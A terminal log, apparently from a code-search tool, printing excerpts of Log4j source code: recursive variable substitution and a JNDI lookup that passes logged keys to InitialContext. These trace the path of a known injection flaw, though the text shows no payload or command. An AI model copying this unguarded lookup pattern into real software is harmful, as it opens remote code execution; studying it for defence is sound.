[2;36m                    [0m         [1;36m732[0m[39m:     * @param offset  the start offset within the builder, must be valid[0m        [2m                [0m
[2;36m                    [0m         [1;36m733[0m[39m:     * @param length  the length within the builder to be processed, must be [0m   [2m                [0m
[2;36m                    [0m         [39mvalid[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m734[0m[39m:     * @return true if altered[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m735[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m736[0m[39m:    protected boolean [0m[1;35msubstitute[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder buf,[0m [2m                [0m
[2;36m                    [0m         [39mfinal int offset, final int length[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m737[0m[39m:        return [0m[1;35msubstitute[0m[1;39m([0m[39mevent, buf, offset, length, null[0m[1;39m)[0m[39m > [0m[1;36m0[0m[39m;[0m                [2m                [0m
[2;36m                    [0m         [1;36m738[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m739[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m740[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m741[0m[39m:     * Recursive handler for multiple levels of interpolation. This is the main[0m [2m                [0m
[2;36m                    [0m         [1;36m742[0m[39m:     * interpolation method, which resolves the values of all variable [0m         [2m                [0m
[2;36m                    [0m         [39mreferences[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m743[0m[39m:     * contained in the passed in text.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m744[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m745[0m[39m:     * @param event The current LogEvent, if there is one.[0m                      [2m                [0m
[2;36m                    [0m         [1;36m746[0m[39m:     * @param buf  the string builder to substitute into, not null[0m              [2m                [0m
[2;36m                    [0m         [1;36m747[0m[39m:     * @param offset  the start offset within the builder, must be valid[0m        [2m                [0m
[2;36m                    [0m         [1;36m748[0m[39m:     * @param length  the length within the builder to be processed, must be [0m   [2m                [0m
[2;36m                    [0m         [39mvalid[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m749[0m[39m:     * @param priorVariables  the stack keeping track of the replaced [0m          [2m                [0m
[2;36m                    [0m         [39mvariables, may be null[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m750[0m[39m:     * @return the length change that occurs, unless priorVariables is null [0m    [2m                [0m
[2;36m                    [0m         [39mwhen the int[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m751[0m[39m:     *  represents a boolean flag as to whether any change occurred.[0m            [2m                [0m
[2;36m                    [0m         [1;36m752[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m753[0m[39m:    private int [0m[1;35msubstitute[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder buf, final[0m [2m                [0m
[2;36m                    [0m         [39mint offset, final int length,[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m754[0m[39m:                           List<String> priorVariables[0m[1;39m)[0m[39m [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m755[0m[39m:        final StrMatcher prefixMatcher = [0m[1;35mgetVariablePrefixMatcher[0m[1;39m([0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m756[0m[39m:        final StrMatcher suffixMatcher = [0m[1;35mgetVariableSuffixMatcher[0m[1;39m([0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m757[0m[39m:        final char escape = [0m[1;35mgetEscapeChar[0m[1;39m([0m[1;39m)[0m[39m;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m758[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m759[0m[39m:        final boolean top = [0m[1;39m([0m[39mpriorVariables == null[0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m760[0m[39m:        boolean altered = false;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m761[0m[39m:        int lengthChange = [0m[1;36m0[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m762[0m[39m:        char[0m[1;39m[[0m[1;39m][0m[39m chars = [0m[1;35mgetChars[0m[1;39m([0m[39mbuf[0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m763[0m[39m:        int bufEnd = offset + length;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m764[0m[39m:        int pos = offset;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m765[0m[39m:        while [0m[1;39m([0m[39mpos < bufEnd[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m766[0m[39m:            final int startMatchLen = [0m[1;35mprefixMatcher.isMatch[0m[1;39m([0m[39mchars, pos, offset,[0m [2m                [0m
[2;36m                    [0m         [1;36m767[0m[39m:                    bufEnd[0m[1;39m)[0m[39m;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m768[0m[39m:            if [0m[1;39m([0m[39mstartMatchLen == [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m769[0m[39m:                pos++;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m770[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m771[0m[39m:                [0m[35m/[0m[35m/[0m[39m found variable start marker[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m772[0m[39m:                if [0m[1;39m([0m[39mpos > offset && chars[0m[1;39m[[0m[39mpos - [0m[1;36m1[0m[1;39m][0m[39m == escape[0m[1;39m)[0m[39m [0m[1;39m{[0m                 [2m                [0m
[2;36m                    [0m         [1;36m773[0m[39m:                    [0m[35m/[0m[35m/[0m[39m escaped[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m774[0m[39m:                    [0m[1;35mbuf.deleteCharAt[0m[1;39m([0m[39mpos - [0m[1;36m1[0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m775[0m[39m:                    chars = [0m[1;35mgetChars[0m[1;39m([0m[39mbuf[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m776[0m[39m:                    lengthChange--;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m777[0m[39m:                    altered = true;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m778[0m[39m:                    bufEnd--;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m779[0m[39m:                [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m780[0m[39m:                    [0m[35m/[0m[35m/[0m[39m find suffix[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m781[0m[39m:                    final int startPos = pos;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m782[0m[39m:                    pos += startMatchLen;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m783[0m[39m:                    int endMatchLen = [0m[1;36m0[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m784[0m[39m:                    int nestedVarCount = [0m[1;36m0[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m785[0m[39m:                    while [0m[1;39m([0m[39mpos < bufEnd[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m786[0m[39m:                        if [0m[1;39m([0m[1;35misEnableSubstitutionInVariables[0m[1;39m([0m[1;39m)[0m                   [2m                [0m
[2;36m                    [0m         [1;36m787[0m[39m:                                && [0m[1;39m([0m[39mendMatchLen = [0m[1;35mprefixMatcher.isMatch[0m[1;39m([0m[39mchars,[0m  [2m                [0m
[2;36m                    [0m         [1;36m788[0m[39m:                                        pos, offset, bufEnd[0m[1;39m)[0m[1;39m)[0m[39m != [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m           [2m                [0m
[2;36m                    [0m         [1;36m789[0m[39m:                            [0m[35m/[0m[35m/[0m[39m found a nested variable start[0m                    [2m                [0m
[2;36m                    [0m         [1;36m790[0m[39m:                            nestedVarCount++;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m791[0m[39m:                            pos += endMatchLen;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m792[0m[39m:                            continue;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m793[0m[39m:                        [0m[1;39m}[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m794[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m795[0m[39m:                        endMatchLen = [0m[1;35msuffixMatcher.isMatch[0m[1;39m([0m[39mchars, pos, offset,[0m [2m                [0m
[2;36m                    [0m         [1;36m796[0m[39m:                                bufEnd[0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m797[0m[39m:                        if [0m[1;39m([0m[39mendMatchLen == [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m798[0m[39m:                            pos++;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m799[0m[39m:                        [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m800[0m[39m:                            [0m[35m/[0m[35m/[0m[39m found variable end marker[0m                        [2m                [0m
[2;36m                    [0m         [1;36m801[0m[39m:                            if [0m[1;39m([0m[39mnestedVarCount == [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                          [2m                [0m
[2;36m                    [0m         [1;36m802[0m[39m:                                String varName = new [0m[1;35mString[0m[1;39m([0m[39mchars, startPos[0m     [2m                [0m
[2;36m                    [0m         [1;36m803[0m[39m:                                        + startMatchLen, pos - startPos[0m         [2m                [0m
[2;36m                    [0m         [1;36m804[0m[39m:                                        - startMatchLen[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m805[0m[39m:                                if [0m[1;39m([0m[1;35misEnableSubstitutionInVariables[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m        [2m                [0m
[2;36m                    [0m         [1;36m806[0m[39m:                                    final StringBuilder bufName = new [0m          [2m                [0m
[2;36m                    [0m         [1;35mStringBuilder[0m[1;39m([0m[39mvarName[0m[1;39m)[0m[39m;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m807[0m[39m:                                    [0m[1;35msubstitute[0m[1;39m([0m[39mevent, bufName, [0m[1;36m0[0m[39m, [0m              [2m                [0m
[2;36m                    [0m         [1;35mbufName.length[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m808[0m[39m:                                    varName = [0m[1;35mbufName.toString[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m809[0m[39m:                                [0m[1;39m}[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m810[0m[39m:                                pos += endMatchLen;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m811[0m[39m:                                final int endPos = pos;[0m                         [2m                [0m
[2;36m                    [0m         [1;36m812[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m813[0m[39m:                                [0m[35m/[0m[35m/[0m[39m on the first call initialize priorVariables[0m  [2m                [0m
[2;36m                    [0m         [1;36m814[0m[39m:                                if [0m[1;39m([0m[39mpriorVariables == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                   [2m                [0m
[2;36m                    [0m         [1;36m815[0m[39m:                                    priorVariables = new ArrayList<String>[0m[1;39m([0m[1;39m)[0m[39m;[0m   [2m                [0m
[2;36m                    [0m         [1;36m816[0m[39m:                                    [0m[1;35mpriorVariables.add[0m[1;39m([0m[39mnew [0m[1;35mString[0m[1;39m([0m[39mchars,[0m        [2m                [0m
[2;36m                    [0m         [1;36m817[0m[39m:                                            offset, length[0m[1;39m)[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m818[0m[39m:                                [0m[1;39m}[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m819[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m820[0m[39m:                                [0m[35m/[0m[35m/[0m[39m handle cyclic substitution[0m                   [2m                [0m
[2;36m                    [0m         [1;36m821[0m[39m:                                [0m[1;35mcheckCyclicSubstitution[0m[1;39m([0m[39mvarName, [0m               [2m                [0m
[2;36m                    [0m         [39mpriorVariables[0m[1;39m)[0m[39m;[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m822[0m[39m:                                [0m[1;35mpriorVariables.add[0m[1;39m([0m[39mvarName[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m823[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m824[0m[39m:                                [0m[35m/[0m[35m/[0m[39m resolve the variable[0m                         [2m                [0m
[2;36m                    [0m         [1;36m825[0m[39m:                                final String varValue = [0m[1;35mresolveVariable[0m[1;39m([0m[39mevent, [0m [2m                [0m
[2;36m                    [0m         [39mvarName, buf,[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m826[0m[39m:                                        startPos, endPos[0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m827[0m[39m:                                if [0m[1;39m([0m[39mvarValue != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m828[0m[39m:                                    [0m[35m/[0m[35m/[0m[39m recursive replace[0m                        [2m                [0m
[2;36m                    [0m         [1;36m829[0m[39m:                                    final int varLen = [0m[1;35mvarValue.length[0m[1;39m([0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m830[0m[39m:                                    [0m[1;35mbuf.replace[0m[1;39m([0m[39mstartPos, endPos, varValue[0m[1;39m)[0m[39m;[0m    [2m                [0m
[2;36m                    [0m         [1;36m831[0m[39m:                                    altered = true;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m832[0m[39m:                                    int change = [0m[1;35msubstitute[0m[1;39m([0m[39mevent, buf, [0m        [2m                [0m
[2;36m                    [0m         [39mstartPos,[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m833[0m[39m:                                            varLen, priorVariables[0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m834[0m[39m:                                    change = change[0m                             [2m                [0m
[2;36m                    [0m         [1;36m835[0m[39m:                                            + [0m[1;39m([0m[39mvarLen - [0m[1;39m([0m[39mendPos - startPos[0m[1;39m)[0m[1;39m)[0m[39m;[0m   [2m                [0m
[2;36m                    [0m         [1;36m836[0m[39m:                                    pos += change;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m837[0m[39m:                                    bufEnd += change;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m838[0m[39m:                                    lengthChange += change;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m839[0m[39m:                                    chars = [0m[1;35mgetChars[0m[1;39m([0m[39mbuf[0m[1;39m)[0m[39m; [0m[35m/[0m[35m/[0m[39m in case buffer [0m   [2m                [0m
[2;36m                    [0m         [39mwas[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m840[0m[39m:                                                        [0m[35m/[0m[35m/[0m[39m altered[0m              [2m                [0m
[2;36m                    [0m         [1;36m841[0m[39m:                                [0m[1;39m}[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m842[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m843[0m[39m:                                [0m[35m/[0m[35m/[0m[39m remove variable from the cyclic stack[0m        [2m                [0m
[2;36m                    [0m         [1;36m844[0m[39m:                                priorVariables[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m845[0m[39m:                                        [0m[1;35m.remove[0m[1;39m([0m[1;35mpriorVariables.size[0m[1;39m([0m[1;39m)[0m[39m - [0m[1;36m1[0m[1;39m)[0m[39m;[0m     [2m                [0m
[2;36m                    [0m         [1;36m846[0m[39m:                                break;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m847[0m[39m:                            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m848[0m[39m:                                nestedVarCount--;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m849[0m[39m:                                pos += endMatchLen;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m850[0m[39m:                            [0m[1;39m}[0m                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:52[0m[39m-[0m[1;36m79[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * Convert the given JNDI name to the actual JNDI name to use.[0m               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * Default implementation applies the [0m[32m"java:comp/env/"[0m[39m prefix[0m                [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * unless other scheme like [0m[32m"java:"[0m[39m is given.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * @param jndiName The name of the resource.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * @return The fully qualified name to look up.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:28[0m[39m-[0m[1;36m35[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"jndi"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:public class JndiLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    private static boolean ENABLE_JNDI = true;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    [0m[35m/[0m[39m** JNDI resourcce path prefix used in a J2EE container *[0m[35m/[0m                   [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [0m[32m"java:comp/env/"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/helpers/Constants.jav[0m[1;92ma:38[0m[39m-[0m[1;36m42[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * JNDI context name string literal.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    public static final String JNDI_CONTEXT_NAME = [0m                              [2m                [0m
[2;36m                    [0m         [32m"java:comp/env/log4j/context-name"[0m[39m;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/selector/JNDIContextSelector.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m110[0m[39m-[0m[1;36m122[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:        String loggingContextName = null;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:        try [0m[1;39m{[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:            final Context ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:            loggingContextName = [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mlookup[0m[1;39m([0m[39mctx, [0m                          [2m                [0m
[2;36m                    [0m         [39mConstants.JNDI_CONTEXT_NAME[0m[1;39m)[0m[39m;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal NamingException ne[0m[1;39m)[0m[39m [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Unable to lookup "[0m[39m + Constants.JNDI_CONTEXT_NAME, [0m    [2m                [0m
[2;36m                    [0m         [39mne[0m[1;39m)[0m[39m;[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:        return loggingContextName == null ? CONTEXT : [0m                          [2m                [0m
[2;36m                    [0m         [1;35mlocateContext[0m[1;39m([0m[39mloggingContextName, configLocation[0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/web/Log4jWebInitializerImpl.jav[0m[1;92ma:2[0m [2m                [0m
[2;36m                    [0m         [1;92m3[0m[39m-[0m[1;36m33[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.LogManager;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.LoggerContext;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.config.Configurator;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.core.impl.ContextAnchor;[0m                         [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:import org.apache.logging.log4j.core.impl.Log4jContextFactory;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:import org.apache.logging.log4j.core.lookup.Interpolator;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:import org.apache.logging.log4j.core.lookup.StrSubstitutor;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:import org.apache.logging.log4j.core.selector.ContextSelector;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:import org.apache.logging.log4j.core.selector.NamedContextSelector;[0m              [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:import org.apache.logging.log4j.spi.LoggerContextFactory;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/web/Log4jWebInitializerImpl.jav[0m[1;92ma:5[0m [2m                [0m
[2;36m                    [0m         [1;92m1[0m[39m-[0m[1;36m80[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    private final StrSubstitutor substitutor = new [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mnew [0m           [2m                [0m
[2;36m                    [0m         [1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    private final ServletContext servletContext;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:    private String name;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    private NamedContextSelector selector;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    private LoggerContext loggerContext;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:    private boolean initialized = false;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    private boolean deinitialized = false;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:[0m                                                                                 [2m                [0m
